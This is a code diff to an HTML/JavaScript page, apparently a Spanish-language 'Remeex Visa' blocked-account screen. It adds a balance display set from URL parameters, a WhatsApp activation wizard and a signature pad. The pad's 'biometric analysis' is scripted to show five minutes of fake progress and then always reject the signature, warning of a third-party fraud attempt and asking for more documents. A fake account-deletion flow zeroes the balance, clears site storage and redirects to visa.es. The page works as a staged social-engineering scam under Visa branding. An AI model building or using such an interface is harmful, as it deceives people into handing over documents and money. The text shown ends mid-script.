@@ -41,11 +41,13 @@
                   var(--bg);
       color: var(--text);
       min-height: 100svh;
-      overflow: hidden;
+      overflow-x: hidden;
+      overflow-y: auto;
+      overscroll-behavior-y: contain;
     }
 
     .viewport {
-      height: 100svh;
+      min-height: 100svh;
       padding: calc(env(safe-area-inset-top, 0) + 10px)
                calc(env(safe-area-inset-right, 0) + 14px)
                calc(env(safe-area-inset-bottom, 0) + 14px)
@@ -56,11 +58,13 @@
       place-items: center;
       position: relative;
       z-index: 10;
+      width: min(640px, 100%);
+      margin: 0 auto;
     }
 
     .card {
-      width: min(420px, 96vw);
-      height: min(70vh, 520px);
+      width: min(420px, 100%);
+      min-height: min(70vh, 520px);
       border-radius: var(--radius-xl);
       padding: 18px;
       background: linear-gradient(180deg, rgba(26,31,113,.8), rgba(20,39,135,.7));
@@ -124,12 +128,39 @@
 
     .btn--wa { background: linear-gradient(135deg, #25D366, #128C7E); }
     .btn--mail { background: linear-gradient(135deg, var(--visa-blue), var(--visa-gold)); }
+    .btn--danger { background: linear-gradient(135deg, #ff5f6d, #d71b3b); }
+    .btn--danger:hover { box-shadow: 0 10px 24px rgba(215,27,59,.35); }
 
     .btn svg { width: 18px; height: 18px; }
 
     .card__top { display: grid; gap: 8px; }
-    .card__body { display: grid; align-content: center; gap: 6px; padding: 0 4px; }
+    .card__body { display: grid; align-content: center; gap: 12px; padding: 0 4px; }
     .card__footer { padding-top: 4px; }
+
+    .balance {
+      display: grid;
+      gap: 10px;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      background: rgba(0,0,0,.18);
+      border: 1px solid rgba(247,182,0,.25);
+      border-radius: 16px;
+      padding: 14px 16px;
+    }
+
+    .balance__item { display: grid; gap: 4px; }
+    .balance__label { font-size: var(--fs-sm); color: rgba(255,255,255,.7); letter-spacing: .02em; text-transform: uppercase; }
+    .balance__value { font-size: clamp(18px, 4.4vw, 22px); font-weight: 700; color: var(--visa-light); }
+
+    .waiting { display: none; gap: 10px; text-align: center; }
+    .waiting__status { font-size: var(--fs-md); color: var(--muted); line-height: 1.4; }
+    .waiting__status strong { color: var(--visa-light); }
+    .waiting__warning { font-size: var(--fs-sm); color: rgba(255,255,255,.65); }
+
+    .loader.waiting__spinner { width: 36px; height: 36px; margin-bottom: 4px; }
+
+    body.is-waiting .desc { display: none; }
+    body.is-waiting .cta { display: none; }
+    body.is-waiting .waiting { display: grid; }
 
     .bg-wrap { position: fixed; inset: 0; z-index: 0; overflow: hidden; }
     .bg-video { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; filter: brightness(.55) saturate(1.05); }
@@ -142,7 +173,7 @@
     .hidden { display: none !important; }
 
     @media (max-height: 640px) {
-      .card { height: min(78vh, 500px); }
+      .card { min-height: min(78vh, 500px); }
       .desc { font-size: clamp(13px, 3.4vw, 14px); }
     }
 
@@ -160,10 +191,11 @@
       background: rgba(0,0,0,.55);
       backdrop-filter: blur(4px);
       padding: 16px;
+      overflow-y: auto;
     }
     .overlay__panel {
       width: min(560px, 96vw);
-      max-height: min(88vh, 720px);
+      max-height: min(92svh, 720px);
       overflow: auto;
       background: linear-gradient(180deg, rgba(26,31,113,.85), rgba(20,39,135,.75));
       border: 1px solid rgba(247,182,0,.35);
@@ -172,6 +204,13 @@
       padding: 18px;
       position: relative;
       color: var(--text);
+    }
+    .overlay__panel--desist { display: grid; gap: 16px; }
+    .overlay__panel--signature {
+      width: min(720px, 96vw);
+      display: grid;
+      grid-template-rows: auto 1fr;
+      gap: 14px;
     }
     .overlay__panel::after{
       content:""; position:absolute; inset:0; border-radius:inherit; padding:1px; pointer-events:none;
@@ -208,6 +247,139 @@
     .btn[disabled] { opacity:.5; cursor:not-allowed; }
     .preview { white-space: pre-wrap; background: rgba(0,0,0,.18); border:1px solid rgba(255,255,255,.22); border-radius:12px; padding:12px; font-size: var(--fs-sm); }
     .mini { font-size: 12px; color: rgba(255,255,255,.7); }
+
+    .desist-step { display: grid; gap: 12px; }
+    .desist-step p { font-size: var(--fs-md); color: var(--muted); line-height: 1.45; }
+    .desist-step ul { margin: 0; padding-left: 1.1rem; display: grid; gap: 6px; font-size: var(--fs-sm); color: rgba(255,255,255,.78); }
+    .desist-warning { background: rgba(215,27,59,0.18); border: 1px solid rgba(255,255,255,0.2); border-radius: 14px; padding: 12px; color: #ffd4d4; font-size: var(--fs-sm); line-height: 1.5; }
+
+    #desistState { display: none; }
+    body.is-desisting #waitingState { display: none !important; }
+    body.is-desisting #desistState { display: grid; }
+    body.is-desisting .cta { opacity: .35; pointer-events: none; }
+    body.is-desisting .desc { color: rgba(255,255,255,.65); }
+
+    .signature-guidance {
+      display: grid;
+      gap: 12px;
+      font-size: var(--fs-sm);
+      color: rgba(255,255,255,.78);
+    }
+    .signature-guidance strong { color: var(--visa-gold); }
+    .signature-pad {
+      display: grid;
+      gap: 10px;
+      background: rgba(0,0,0,.22);
+      border: 1px solid rgba(247,182,0,.35);
+      border-radius: 18px;
+      padding: 16px;
+    }
+    .signature-pad__canvas {
+      position: relative;
+      border-radius: 14px;
+      overflow: hidden;
+      background: rgba(0,0,0,.35);
+      min-height: clamp(180px, 45vh, 320px);
+    }
+    canvas#signaturePad {
+      width: 100%;
+      height: 100%;
+      touch-action: none;
+      display: block;
+    }
+    .signature-pad__hint {
+      font-size: var(--fs-sm);
+      color: rgba(255,255,255,.6);
+      text-align: center;
+    }
+    .signature-actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      justify-content: space-between;
+    }
+    .signature-actions .btn {
+      flex: 1 1 140px;
+    }
+    .signature-actions .btn--ghost {
+      background: rgba(0,0,0,.25);
+    }
+
+    .signature-analysis__box {
+      width: min(420px, 90vw);
+      background: linear-gradient(180deg, rgba(26,31,113,.88), rgba(20,39,135,.75));
+      border: 1px solid rgba(247,182,0,.35);
+      border-radius: 18px;
+      padding: 24px;
+      text-align: center;
+      box-shadow: var(--ok-shadow);
+      display: grid;
+      gap: 16px;
+      color: #fff;
+    }
+    .signature-analysis__dots {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      letter-spacing: 0.12em;
+      color: rgba(255,255,255,.65);
+    }
+    .signature-analysis__detail {
+      font-size: var(--fs-sm);
+      color: rgba(255,255,255,.75);
+      min-height: 3.5em;
+    }
+    .signature-analysis__result {
+      display: grid;
+      gap: 10px;
+    }
+    .signature-analysis__result.hidden {
+      display: none;
+    }
+    .signature-analysis__result p {
+      font-size: var(--fs-sm);
+      color: rgba(255,255,255,.85);
+      line-height: 1.45;
+      text-align: left;
+    }
+    .signature-analysis__result strong { color: var(--visa-gold); }
+
+    @media (max-width: 480px) {
+      body {
+        background-attachment: fixed;
+      }
+      .viewport {
+        padding: calc(env(safe-area-inset-top, 0) + 14px) 16px calc(env(safe-area-inset-bottom, 0) + 24px);
+        align-content: start;
+      }
+      .card {
+        min-height: unset;
+      }
+      .balance {
+        grid-template-columns: 1fr;
+      }
+      .signature-guidance {
+        font-size: var(--fs-md);
+      }
+      .signature-actions {
+        flex-direction: column;
+      }
+    }
+
+    @media (max-height: 680px) {
+      .viewport {
+        min-height: auto;
+      }
+      .overlay {
+        align-items: flex-start;
+        padding-top: calc(env(safe-area-inset-top, 0) + 24px);
+        padding-bottom: calc(env(safe-area-inset-bottom, 0) + 24px);
+      }
+      .overlay__panel {
+        max-height: none;
+      }
+      .overlay__panel--signature {
+        min-height: calc(100svh - 64px);
+      }
+    }
 
     /* Spinner overlay */
     .spinner {
@@ -266,12 +438,33 @@
         <h1 id="título" class="title">Cuenta Bloqueada Temporalmente</h1>
       </header>
       <div class="card__body">
+        <div class="balance" aria-live="polite">
+          <div class="balance__item">
+            <div class="balance__label">Saldo disponible (Bs.)</div>
+            <div id="saldoBs" class="balance__value">Bs. 0,00</div>
+          </div>
+          <div class="balance__item">
+            <div class="balance__label">Saldo disponible (USD)</div>
+            <div id="saldoUsd" class="balance__value">$0.00</div>
+          </div>
+        </div>
         <p id="texto" class="desc">Su cuenta ha sido suspendida por motivos de seguridad. Para resolver este inconveniente y reactivar su cuenta, debe comunicarse inmediatamente con nuestro equipo de soporte técnico.</p>
+        <div id="waitingState" class="waiting" aria-live="assertive">
+          <div class="loader waiting__spinner" aria-hidden="true"></div>
+          <p class="waiting__status">Esperamos que <strong id="waitingUser">el titular</strong> subsane la información solicitada. Mientras tanto, tu cuenta permanecerá bloqueada.</p>
+          <p class="waiting__warning">Si la información no se subsana, la cuenta será suspendida definitivamente por medidas de seguridad.</p>
+        </div>
+        <div id="desistState" class="waiting" aria-live="assertive">
+          <div class="loader waiting__spinner" aria-hidden="true"></div>
+          <p class="waiting__status"><strong>Procesando eliminación definitiva.</strong> Estamos devolviendo los fondos al origen y cerrando tu cuenta.</p>
+          <p class="waiting__warning">Una vez finalizado, no será posible revertir esta decisión ni volver a usar estos datos.</p>
+        </div>
       </div>
       <footer class="card__footer">
         <div class="cta">
-          <button id="btnSolicitar" class="btn btn--wa" type="button">Solicitar desbloqueo</button>
-          <a class="btn btn--mail" href="mailto:info@remeexvisa.com?subject=Cuenta%20Bloqueada%20-%20Solicitud%20de%20Asistencia&body=Estimado%20equipo%20de%20soporte%2C%0A%0AMi%20cuenta%20de%20Remeex%20Visa%20ha%20sido%20bloqueada%20temporalmente%20y%20necesito%20asistencia%20para%20resolver%20este%20problema.%0A%0APor%20favor%2C%20cont%C3%A1ctenme%20a%20la%20brevedad%20posible.%0A%0AGracias.">Enviar Email</a>
+          <button id="btnSolicitar" class="btn btn--wa" type="button">Activar mi cuenta</button>
+          <a class="btn btn--mail" href="mailto:info@remeexvisa.com?subject=Cuenta%20Bloqueada%20-%20Solicitud%20de%20Asistencia&body=Estimado%20equipo%20de%20soporte%2C%0A%0AMi%20cuenta%20de%20Remeex%20Visa%20ha%20sido%20bloqueada%20temporalmente%20y%20necesito%20asistencia%20para%20activarla%20nuevamente.%0A%0APor%20favor%2C%20cont%C3%A1ctenme%20a%20la%20brevedad%20posible.%0A%0AGracias.">Enviar Email</a>
+          <button id="btnDesistir" class="btn btn--danger" type="button">Eliminar mi cuenta</button>
         </div>
       </footer>
     </article>
@@ -283,8 +476,8 @@
     <div class="overlay__panel">
       <div class="overlay__header">
         <div>
-          <div class="overlay__title" id="wizardTitle">Solicitud de Desbloqueo</div>
-          <div class="mini">Completa los pasos para generar el mensaje automático de WhatsApp.</div>
+          <div class="overlay__title" id="wizardTitle">Solicitud para activar tu cuenta</div>
+          <div class="mini">Completa los pasos para generar el mensaje automático de WhatsApp y avanzar con la activación.</div>
         </div>
         <button class="overlay__close" id="closeOverlay" type="button" aria-label="Cerrar">Cerrar</button>
       </div>
@@ -396,6 +589,97 @@
     </div>
   </div>
 
+  <!-- Overlay de firma manual -->
+  <div id="signatureOverlay" class="overlay hidden" role="dialog" aria-modal="true" aria-labelledby="signatureTitle">
+    <div class="overlay__panel overlay__panel--signature">
+      <div class="overlay__header">
+        <div>
+          <div class="overlay__title" id="signatureTitle">Subsanar firma en línea</div>
+          <div class="mini">Gira tu dispositivo para usarlo en modo horizontal y aprovechar todo el espacio.</div>
+        </div>
+        <button class="overlay__close" id="closeSignature" type="button" aria-label="Cerrar">Cerrar</button>
+      </div>
+
+      <div class="signature-guidance">
+        <p><strong>Tu firma no coincidió.</strong> Regístrala de nuevo para intentar validar tu identidad.</p>
+        <p>Coloca el móvil en posición horizontal, apóyate en una superficie firme y dibuja dentro del recuadro. Asegúrate de replicar la firma de tu cédula.</p>
+
+        <div class="signature-pad">
+          <div class="signature-pad__canvas">
+            <canvas id="signaturePad" aria-label="Área para firmar" tabindex="0"></canvas>
+          </div>
+          <div class="signature-pad__hint">Puedes usar tu dedo o un stylus. Si cometes un error, limpia y vuelve a intentar.</div>
+        </div>
+
+        <div class="signature-actions">
+          <button id="clearSignature" type="button" class="btn btn--ghost">Limpiar firma</button>
+          <button id="sendSignature" type="button" class="btn btn--wa">Enviar firma</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Overlay de análisis de firma -->
+  <div id="signatureAnalysis" class="overlay hidden signature-analysis" role="alertdialog" aria-modal="true" aria-live="assertive">
+    <div class="signature-analysis__box">
+      <div class="loader" id="signatureLoader" aria-hidden="true"></div>
+      <div>
+        <div id="analysisHeadline">Analizando la firma enviada…</div>
+        <div id="analysisDots" class="signature-analysis__dots" aria-hidden="true">···</div>
+      </div>
+      <div id="analysisDetail" class="signature-analysis__detail">Iniciando verificación biométrica y comparación de trazos.</div>
+      <div id="analysisResult" class="signature-analysis__result hidden">
+        <p><strong>Resultado:</strong> La firma <strong>no coincide fielmente</strong> con la registrada en tu cédula.</p>
+        <p>Por protocolo de seguridad, el sistema detecta que la solicitud podría estar siendo realizada por un tercero que intenta cobrar los fondos en nombre del titular.</p>
+        <p>Continúa el proceso de verificación y aporta la documentación solicitada para demostrar que eres el titular legítimo.</p>
+      </div>
+      <button id="analysisClose" class="btn btn--wa hidden" type="button">Entendido, continuar</button>
+    </div>
+  </div>
+
+  <!-- Overlay para eliminar cuenta -->
+  <div id="desistOverlay" class="overlay hidden" role="dialog" aria-modal="true" aria-labelledby="desistTitle">
+    <div class="overlay__panel overlay__panel--desist">
+      <div class="overlay__header">
+        <div>
+          <div class="overlay__title" id="desistTitle">Eliminar definitivamente mi cuenta</div>
+          <div class="mini">Al continuar renuncias a activar tu cuenta y confirmas su eliminación.</div>
+        </div>
+        <button class="overlay__close" id="desistClose" type="button">Cerrar</button>
+      </div>
+      <section class="desist-step" data-desist-step="1">
+        <p>Si decides eliminarla, cancelaremos la activación en curso, devolveremos los fondos al origen y cerraremos tu cuenta de manera definitiva.</p>
+        <ul>
+          <li>Devolución del saldo a la tarjeta utilizada originalmente para recargar.</li>
+          <li>Reversión de cualquier intercambio de fondos pendiente.</li>
+          <li>Cancelación de la relación comercial y eliminación de accesos.</li>
+        </ul>
+        <p>Una vez solicitado, ya no podremos revisar tu caso ni permitir futuros retiros con estos datos.</p>
+        <div class="wizard-nav">
+          <button class="btn btn--ghost" id="desistCancel" type="button">Prefiero seguir con la activación</button>
+          <button class="btn btn--danger" id="desistProceed" type="button">Quiero eliminarla</button>
+        </div>
+      </section>
+      <section class="desist-step hidden" data-desist-step="2">
+        <p><strong>Antes de continuar:</strong> eliminar tu cuenta implica <strong>cerrarla definitivamente</strong> y perder todos los accesos.</p>
+        <div class="desist-warning">Esta acción es irreversible. No podrás recuperar el saldo, la cuenta ni los servicios asociados una vez confirmes.</div>
+        <div class="wizard-nav">
+          <button class="btn btn--ghost" id="desistBack" type="button">Volver</button>
+          <button class="btn btn--danger" id="desistConfirm" type="button">Sí, eliminar definitivamente</button>
+        </div>
+      </section>
+    </div>
+  </div>
+
+  <!-- Proceso de eliminación -->
+  <div id="desistProcessing" class="spinner" aria-live="assertive" aria-busy="true">
+    <div class="spinner__box">
+      <div class="loader" aria-hidden="true"></div>
+      <div id="desistProcessingMessage">Preparando la eliminación de tu cuenta...</div>
+      <div class="mini">Por favor, no cierres esta ventana.</div>
+    </div>
+  </div>
+
   <!-- Spinner de análisis -->
   <div id="spinner" class="spinner" aria-live="polite" aria-busy="true">
     <div class="spinner__box">
@@ -470,6 +754,7 @@
 
       const overlay = qs('#overlay');
       const btnSolicitar = qs('#btnSolicitar');
+      const btnDesistir = qs('#btnDesistir');
       const closeOverlay = qs('#closeOverlay');
       const cancelWizard = qs('#cancelWizard');
 
@@ -484,6 +769,43 @@
       const sendWa = qs('#sendWa');
 
       const spinner = document.getElementById('spinner');
+      const desistOverlay = qs('#desistOverlay');
+      const desistSteps = desistOverlay ? Array.from(desistOverlay.querySelectorAll('[data-desist-step]')) : [];
+      const desistClose = qs('#desistClose');
+      const desistCancel = qs('#desistCancel');
+      const desistProceed = qs('#desistProceed');
+      const desistBack = qs('#desistBack');
+      const desistConfirm = qs('#desistConfirm');
+      const desistProcessing = qs('#desistProcessing');
+      const desistProcessingMessage = qs('#desistProcessingMessage');
+      const desistState = qs('#desistState');
+      const descText = qs('#texto');
+
+      const signatureOverlay = qs('#signatureOverlay');
+      const closeSignature = qs('#closeSignature');
+      const clearSignature = qs('#clearSignature');
+      const sendSignature = qs('#sendSignature');
+      const signatureCanvas = qs('#signaturePad');
+      const signatureHint = qs('.signature-pad__hint');
+      const signatureAnalysis = qs('#signatureAnalysis');
+      const analysisHeadline = qs('#analysisHeadline');
+      const analysisDots = qs('#analysisDots');
+      const analysisDetail = qs('#analysisDetail');
+      const analysisResult = qs('#analysisResult');
+      const analysisClose = qs('#analysisClose');
+      const signatureLoader = qs('#signatureLoader');
+      const defaultSignatureHint = signatureHint ? signatureHint.textContent : '';
+      const defaultAnalysisHeadline = analysisHeadline ? analysisHeadline.textContent : '';
+      const defaultAnalysisDetail = analysisDetail ? analysisDetail.textContent : '';
+
+      let signatureCtx = null;
+      let isDrawingSignature = false;
+      let hasSignatureStroke = false;
+      let dotsInterval = null;
+      let analysisTimers = [];
+      let desistTimers = [];
+      let desistInProgress = false;
+      let desistCleanupStarted = false;
 
       const suspension = document.getElementById('suspension');
       const suspDismiss = document.getElementById('suspDismiss');
@@ -498,6 +820,175 @@
       }
       function hideOverlay() { overlay.classList.add('hidden'); }
 
+      function resetSignatureHint(){
+        if(!signatureHint) return;
+        signatureHint.textContent = defaultSignatureHint;
+        signatureHint.style.color = 'rgba(255,255,255,.6)';
+      }
+
+      function showSignatureOverlay(){
+        if(!signatureOverlay) return;
+        resetSignatureHint();
+        signatureOverlay.classList.remove('hidden');
+        requestAnimationFrame(()=> resizeSignatureCanvas());
+        setTimeout(resizeSignatureCanvas, 120);
+      }
+
+      function hideSignatureOverlay(){
+        if(!signatureOverlay) return;
+        signatureOverlay.classList.add('hidden');
+      }
+
+      function resizeSignatureCanvas(){
+        if(!signatureCanvas) return;
+        const rect = signatureCanvas.getBoundingClientRect();
+        if(rect.width === 0 || rect.height === 0) return;
+        const ratio = window.devicePixelRatio || 1;
+        signatureCanvas.width = rect.width * ratio;
+        signatureCanvas.height = rect.height * ratio;
+        signatureCtx = signatureCanvas.getContext('2d');
+        signatureCtx.setTransform(1,0,0,1,0,0);
+        signatureCtx.clearRect(0,0, signatureCanvas.width, signatureCanvas.height);
+        signatureCtx.scale(ratio, ratio);
+        signatureCtx.lineWidth = 2.6;
+        signatureCtx.lineCap = 'round';
+        signatureCtx.lineJoin = 'round';
+        signatureCtx.strokeStyle = '#F7B600';
+        hasSignatureStroke = false;
+      }
+
+      function signaturePointerPos(evt){
+        const rect = signatureCanvas.getBoundingClientRect();
+        return {
+          x: evt.clientX - rect.left,
+          y: evt.clientY - rect.top
+        };
+      }
+
+      function startSignature(evt){
+        if(!signatureCtx) return;
+        evt.preventDefault();
+        const pos = signaturePointerPos(evt);
+        signatureCtx.beginPath();
+        signatureCtx.moveTo(pos.x, pos.y);
+        signatureCtx.lineTo(pos.x + 0.01, pos.y + 0.01);
+        signatureCtx.stroke();
+        signatureCtx.beginPath();
+        signatureCtx.moveTo(pos.x, pos.y);
+        isDrawingSignature = true;
+        hasSignatureStroke = true;
+        try { signatureCanvas.setPointerCapture(evt.pointerId); } catch(_){}
+      }
+
+      function drawSignature(evt){
+        if(!isDrawingSignature || !signatureCtx) return;
+        evt.preventDefault();
+        const pos = signaturePointerPos(evt);
+        signatureCtx.lineTo(pos.x, pos.y);
+        signatureCtx.stroke();
+        hasSignatureStroke = true;
+      }
+
+      function endSignature(evt){
+        if(!isDrawingSignature || !signatureCtx) return;
+        evt.preventDefault();
+        signatureCtx.closePath();
+        isDrawingSignature = false;
+        try { signatureCanvas.releasePointerCapture(evt.pointerId); } catch(_){}
+      }
+
+      function clearSignatureCanvas(){
+        resizeSignatureCanvas();
+        resetSignatureHint();
+      }
+
+      function indicateSignatureRequired(){
+        if(!signatureHint) return;
+        signatureHint.textContent = 'Debes trazar tu firma completa antes de enviarla.';
+        signatureHint.style.color = '#ffd36b';
+        setTimeout(()=>{
+          resetSignatureHint();
+        }, 4000);
+      }
+
+      function stopDots(){
+        if(dotsInterval){
+          clearInterval(dotsInterval);
+          dotsInterval = null;
+        }
+      }
+
+      function resetAnalysisTimers(){
+        analysisTimers.forEach(id=> clearTimeout(id));
+        analysisTimers = [];
+      }
+
+      function resetAnalysisUI(){
+        if(signatureLoader) signatureLoader.classList.remove('hidden');
+        if(analysisResult) analysisResult.classList.add('hidden');
+        if(analysisClose) analysisClose.classList.add('hidden');
+        if(analysisDots) analysisDots.textContent = '·';
+        if(analysisHeadline) analysisHeadline.textContent = defaultAnalysisHeadline;
+        if(analysisDetail) analysisDetail.textContent = defaultAnalysisDetail;
+      }
+
+      function prepareAnalysisOverlay(){
+        if(!signatureAnalysis) return;
+        resetAnalysisUI();
+        signatureAnalysis.classList.remove('hidden');
+      }
+
+      function startDots(){
+        if(!analysisDots) return;
+        const frames = ['·', '··', '···', '····', '···', '··'];
+        let i = 0;
+        stopDots();
+        dotsInterval = setInterval(()=>{
+          analysisDots.textContent = frames[i % frames.length];
+          i++;
+        }, 600);
+      }
+
+      function finishSignatureAnalysis(){
+        stopDots();
+        resetAnalysisTimers();
+        if(signatureLoader) signatureLoader.classList.add('hidden');
+        if(analysisDots) analysisDots.textContent = '×';
+        if(analysisHeadline) analysisHeadline.textContent = 'Firma rechazada por inconsistencias';
+        if(analysisDetail) analysisDetail.textContent = 'No pudimos validar la coincidencia biométrica de la firma.';
+        if(analysisResult) analysisResult.classList.remove('hidden');
+        if(analysisClose){
+          analysisClose.classList.remove('hidden');
+          analysisClose.focus({ preventScroll: true });
+        }
+      }
+
+      function startSignatureAnalysis(){
+        if(!signatureOverlay || !signatureAnalysis) return;
+        hideSignatureOverlay();
+        stopDots();
+        resetAnalysisTimers();
+        prepareAnalysisOverlay();
+        startDots();
+        const steps = [
+          { time: 0, text: 'Iniciando verificación biométrica y comparación de trazos.' },
+          { time: 60000, text: 'Contrastando los vectores de la firma con la base de datos del titular.' },
+          { time: 120000, text: 'Evaluando presión, velocidad y puntos de inflexión del trazo.' },
+          { time: 180000, text: 'Comparando coincidencia angular con la firma registrada en la cédula.' },
+          { time: 240000, text: 'Aplicando filtros antifraude y heurísticas de suplantación.' }
+        ];
+        steps.forEach(step => {
+          const timer = setTimeout(()=>{
+            if(analysisDetail) analysisDetail.textContent = step.text;
+          }, step.time);
+          analysisTimers.push(timer);
+        });
+        const finalTimer = setTimeout(()=>{
+          finishSignatureAnalysis();
+        }, 300000);
+        analysisTimers.push(finalTimer);
+      }
+
       function setStep(n){
         steps.forEach(sec => sec.classList.toggle('hidden', sec.getAttribute('data-step') !== String(n)));
         bars.forEach(bar => {
@@ -505,6 +996,180 @@
           bar.classList.toggle('is-active', i === n);
           bar.classList.toggle('is-done', i < n);
         });
+      }
+
+      function setDesistStep(step){
+        if(!desistOverlay || !desistSteps.length) return;
+        desistSteps.forEach(sec => sec.classList.toggle('hidden', sec.getAttribute('data-desist-step') !== String(step)));
+      }
+
+      function openDesistOverlay(){
+        if(!desistOverlay) return;
+        setDesistStep(1);
+        desistOverlay.classList.remove('hidden');
+        const focusTarget = desistOverlay.querySelector('[data-desist-step="1"] .btn--danger');
+        focusTarget && focusTarget.focus({ preventScroll: true });
+      }
+
+      function closeDesistOverlay(){
+        if(!desistOverlay) return;
+        desistOverlay.classList.add('hidden');
+      }
+
+      function clearDesistTimers(){
+        desistTimers.forEach(id => clearTimeout(id));
+        desistTimers = [];
+      }
+
+      function animateBalancesToZero(){
+        return new Promise(resolve => {
+          const duration = 2400;
+          const startBs = saldoBsValue || 0;
+          const startUsd = saldoUsdValue || 0;
+          if(!saldoBsEl && !saldoUsdEl){
+            resolve();
+            return;
+          }
+          if(startBs <= 0 && startUsd <= 0){
+            if(saldoBsEl) saldoBsEl.textContent = formatAmount('0', 'es-VE', 'VES', 'Bs. 0,00');
+            if(saldoUsdEl) saldoUsdEl.textContent = formatAmount('0', 'es-US', 'USD', '$0.00');
+            resolve();
+            return;
+          }
+          const startTime = performance.now();
+          const step = (now)=>{
+            const progress = Math.min((now - startTime) / duration, 1);
+            if(saldoBsEl){
+              const currentBs = Math.max(startBs * (1 - progress), 0);
+              saldoBsEl.textContent = formatAmount(String(currentBs), 'es-VE', 'VES', 'Bs. 0,00');
+            }
+            if(saldoUsdEl){
+              const currentUsd = Math.max(startUsd * (1 - progress), 0);
+              saldoUsdEl.textContent = formatAmount(String(currentUsd), 'es-US', 'USD', '$0.00');
+            }
+            if(progress < 1){
+              requestAnimationFrame(step);
+            } else {
+              if(saldoBsEl) saldoBsEl.textContent = formatAmount('0', 'es-VE', 'VES', 'Bs. 0,00');
+              if(saldoUsdEl) saldoUsdEl.textContent = formatAmount('0', 'es-US', 'USD', '$0.00');
+              saldoBsValue = 0;
+              saldoUsdValue = 0;
+              resolve();
+            }
+          };
+          requestAnimationFrame(step);
+        });
+      }
+
+      function updateDesistMessage(text){
+        if(desistProcessingMessage) desistProcessingMessage.textContent = text;
+      }
+
+      function runDesistProcessing(){
+        if(!desistProcessing){
+          completeDesistCleanup();
+          return;
+        }
+        desistProcessing.classList.add('is-on');
+        clearDesistTimers();
+        const steps = [
+          'Liberando los fondos hacia el medio original...',
+          'Revirtiendo intercambios y conciliaciones pendientes...',
+          'Eliminando credenciales y datos asociados a esta cuenta...',
+          'Confirmando la eliminación definitiva y bloqueando nuevos accesos...'
+        ];
+        let delay = 0;
+        steps.forEach((msg)=>{
+          const timer = setTimeout(()=> updateDesistMessage(msg), delay);
+          desistTimers.push(timer);
+          delay += 2000;
+        });
+        const finalTimer = setTimeout(()=>{
+          completeDesistCleanup();
+        }, delay + 800);
+        desistTimers.push(finalTimer);
+      }
+
+      function disableButtons(btns){
+        btns.filter(Boolean).forEach(btn => {
+          btn.disabled = true;
+          btn.setAttribute('aria-disabled', 'true');
+        });
+      }
+
+      function startDesistFlow(){
+        if(desistInProgress) return;
+        desistInProgress = true;
+        closeDesistOverlay();
+        document.body.classList.add('is-desisting');
+        if(descText){
+          descText.textContent = 'Has decidido eliminar tu cuenta. Estamos devolviendo los fondos y cerrándola de forma definitiva.';
+        }
+        if(desistState){
+          desistState.classList.remove('hidden');
+        }
+        disableButtons([btnSolicitar, btnDesistir, sendWa]);
+        animateBalancesToZero().then(()=>{
+          runDesistProcessing();
+        });
+      }
+
+      async function clearUserData(){
+        try { localStorage.clear(); } catch(_){}
+        try { sessionStorage.clear(); } catch(_){}
+        try {
+          if('caches' in window && window.caches){
+            const keys = await window.caches.keys();
+            await Promise.all(keys.map(k => window.caches.delete(k)));
+          }
+        } catch(_){}
+        try {
+          if('serviceWorker' in navigator && navigator.serviceWorker){
+            const regs = await navigator.serviceWorker.getRegistrations();
+            await Promise.all(regs.map(r => r.unregister()));
+          }
+        } catch(_){}
+        try {
+          if(typeof indexedDB !== 'undefined' && indexedDB && indexedDB.databases){
+            const dbs = await indexedDB.databases();
+            await Promise.all(dbs.map(db => db && db.name ? indexedDB.deleteDatabase(db.name) : null));
+          }
+        } catch(_){}
+        try {
+          if(document.cookie){
+            document.cookie.split(';').forEach(cookie => {
+              const eqPos = cookie.indexOf('=');
+              const name = eqPos > -1 ? cookie.slice(0, eqPos) : cookie;
+              document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/`;
+            });
+          }
+        } catch(_){}
+      }
+
+      function showBlankScreen(){
+        try {
+          document.open();
+          document.write('<div style="position:fixed;inset:0;background:rgba(255,255,255,0.85);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#1A1F71;font-size:20px;text-align:center;padding:24px;">Cuenta eliminada definitivamente. Redirigiendo…</div>');
+          document.close();
+        } catch(_){}
+      }
+
+      async function completeDesistCleanup(){
+        if(desistCleanupStarted) return;
+        desistCleanupStarted = true;
+        clearDesistTimers();
+        updateDesistMessage('Cuenta eliminada. Finalizando sesión segura...');
+        try {
+          await clearUserData();
+        } catch(_){}
+        setTimeout(()=>{
+          showBlankScreen();
+          setTimeout(()=>{
+            try {
+              window.location.replace('https://visa.es');
+            } catch(_){}
+          }, 900);
+        }, 500);
       }
 
       function valStep1(){
@@ -530,6 +1195,71 @@
         return !!(r1 && r2 && r3 && r4);
       }
 
+      function parseAmount(raw){
+        if(raw === undefined || raw === null) return null;
+        const str = raw.toString().trim();
+        if(!str) return null;
+        const cleaned = str.replace(/[^0-9.,-]/g, '');
+        if(!cleaned) return null;
+        const lastComma = cleaned.lastIndexOf(',');
+        const lastDot = cleaned.lastIndexOf('.');
+        const decimalIndex = Math.max(lastComma, lastDot);
+        let integerPart = cleaned;
+        let decimalPart = '';
+        if(decimalIndex !== -1){
+          integerPart = cleaned.slice(0, decimalIndex);
+          decimalPart = cleaned.slice(decimalIndex + 1);
+        }
+        integerPart = integerPart.replace(/[.,]/g, '');
+        decimalPart = decimalPart.replace(/[.,]/g, '');
+        const normalized = decimalIndex !== -1 ? `${integerPart}.${decimalPart}` : integerPart;
+        const num = Number(normalized);
+        return Number.isFinite(num) ? num : null;
+      }
+
+      function formatAmount(raw, locale, currency, fallback){
+        const parsed = parseAmount(raw);
+        if(parsed === null){
+          return raw && raw.toString().trim() ? raw : fallback;
+        }
+        return new Intl.NumberFormat(locale, {
+          style: 'currency',
+          currency,
+          minimumFractionDigits: 2,
+          maximumFractionDigits: 2
+        }).format(parsed);
+      }
+
+      const saldoBsEl = qs('#saldoBs');
+      const saldoUsdEl = qs('#saldoUsd');
+      const waitingState = qs('#waitingState');
+      const waitingUser = qs('#waitingUser');
+      let waitingActivated = false;
+
+      const params = new URLSearchParams(window.location.search);
+      const saldoBsParam = params.get('saldo_bs') || params.get('saldoBs');
